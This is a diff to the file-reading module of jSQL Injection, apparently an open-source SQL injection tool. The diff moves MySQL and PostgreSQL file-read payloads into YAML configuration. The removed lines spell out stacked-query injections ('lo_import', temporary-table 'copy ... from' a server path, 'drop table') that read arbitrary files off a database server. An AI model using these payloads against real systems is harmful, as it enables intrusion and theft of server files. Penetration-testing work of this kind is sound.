@@ -3,15 +3,17 @@ package com.jsql.model.accessible;
 import com.jsql.model.InjectionModel;
 import com.jsql.model.bean.database.MockElement;
 import com.jsql.model.exception.InjectionFailureException;
-import com.jsql.model.exception.JSqlException;
 import com.jsql.model.exception.StoppedByUserSlidingException;
+import com.jsql.model.injection.vendor.model.VendorYaml;
 import com.jsql.model.suspendable.SuspendableGetRows;
 import com.jsql.util.LogLevelUtil;
+import org.apache.commons.codec.binary.Hex;
 import org.apache.commons.lang3.RandomStringUtils;
 import org.apache.commons.lang3.StringUtils;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
+import java.nio.charset.StandardCharsets;
 import java.util.concurrent.Callable;
 
 /**
@@ -63,7 +65,10 @@ public class CallableFile implements Callable<CallableFile> {
         try {
             if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getMysql()) {
                 resultToParse = this.suspendableReadFile.run(
-                    this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(this.pathFile),
+                    this.injectionModel.getResourceAccess().getExploitMysql().getModelYaml().getFile().getRead().replace(
+                        VendorYaml.FILEPATH_HEX,
+                        Hex.encodeHexString(this.pathFile.getBytes(StandardCharsets.UTF_8))
+                    ),
                     sourcePage,
                     false,
                     1,
@@ -73,7 +78,10 @@ public class CallableFile implements Callable<CallableFile> {
             } else if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getPostgres()) {
                 try {
                     resultToParse = this.suspendableReadFile.run(
-                        this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(this.pathFile),
+                        String.format(
+                            this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getRead().getFromDataFolder(),
+                            this.pathFile
+                        ),
                         sourcePage,
                         false,
                         1,
@@ -82,27 +90,51 @@ public class CallableFile implements Callable<CallableFile> {
                     );
                 } catch (InjectionFailureException e) {
                     LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Read data folder failure, trying with large object");
-                    var loid = this.injectionModel.getResourceAccess().getResultWithCatch("SELECT lo_import('"+ this.pathFile +"')::text", "pg#add-loid");
+                    var loid = this.injectionModel.getResourceAccess().getResultWithCatch(String.format(
+                        this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getRead().getLargeObject().getFromPath(),
+                        this.pathFile
+                    ), "pg#add-loid");
                     if (StringUtils.isNotEmpty(loid)) {
-                        resultToParse = this.injectionModel.getResourceAccess().getResultWithCatch("SELECT convert_from(lo_get("+ loid +"),'utf8')::text", "pg#read-lo");
+                        resultToParse = this.injectionModel.getResourceAccess().getResultWithCatch(String.format(
+                            this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getRead().getLargeObject().getToText(),
+                            loid
+                        ), "pg#read-lo");
                     }
                     if (StringUtils.isEmpty(resultToParse)) {
                         LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Read large object failure, trying with stack read");
                         var nameLibraryRandom = "tmp_" + RandomStringUtils.secure().nextAlphabetic(8);  // no dash in table name
-                        this.injectionModel.injectWithoutIndex(";drop table " + nameLibraryRandom + ";", "pg#drop-tbl");
-                        this.injectionModel.injectWithoutIndex(";create table " + nameLibraryRandom + "(data text);", "pg#add-tbl");
-                        this.injectionModel.injectWithoutIndex(";copy " + nameLibraryRandom + "(data) from '" + this.pathFile + "' delimiter E'\\x01';", "pg#copy");
+                        this.injectionModel.injectWithoutIndex(String.format(
+                            this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getWrite().getTempTable().getDrop(),
+                            nameLibraryRandom
+                        ), "pg#drop-tbl");
+                        this.injectionModel.injectWithoutIndex(String.format(
+                            this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getWrite().getTempTable().getAdd(),
+                            nameLibraryRandom
+                        ), "pg#add-tbl");
+                        this.injectionModel.injectWithoutIndex(String.format(
+                            this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getWrite().getTempTable().getFill(),
+                            nameLibraryRandom,
+                            this.pathFile
+                        ), "pg#copy");
                         resultToParse = this.suspendableReadFile.run(
-                            "array_to_string(array(select * from " + nameLibraryRandom + "),'\\n')",
+                            String.format(
+                                this.injectionModel.getResourceAccess().getExploitPostgres().getModelYaml().getFile().getRead().getFromTempTable(),
+                                nameLibraryRandom
+                            ),
                             sourcePage,
                             false,
                             1,
                             MockElement.MOCK,
                             "pg#get-tbl"
                         );
-                        this.injectionModel.injectWithoutIndex(";drop table " + nameLibraryRandom + ";", "pg#drop-tbl");
                     }
                 }
+            } else {
+                LOGGER.log(
+                    LogLevelUtil.CONSOLE_DEFAULT,
+                    "Read file not implemented for [{}], share a working example to GitHub to speed up release",
+                    this.injectionModel.getMediatorVendor().getVendor()
+                );
             }
         } catch (InjectionFailureException e) {
             // Usually thrown if File does not exist
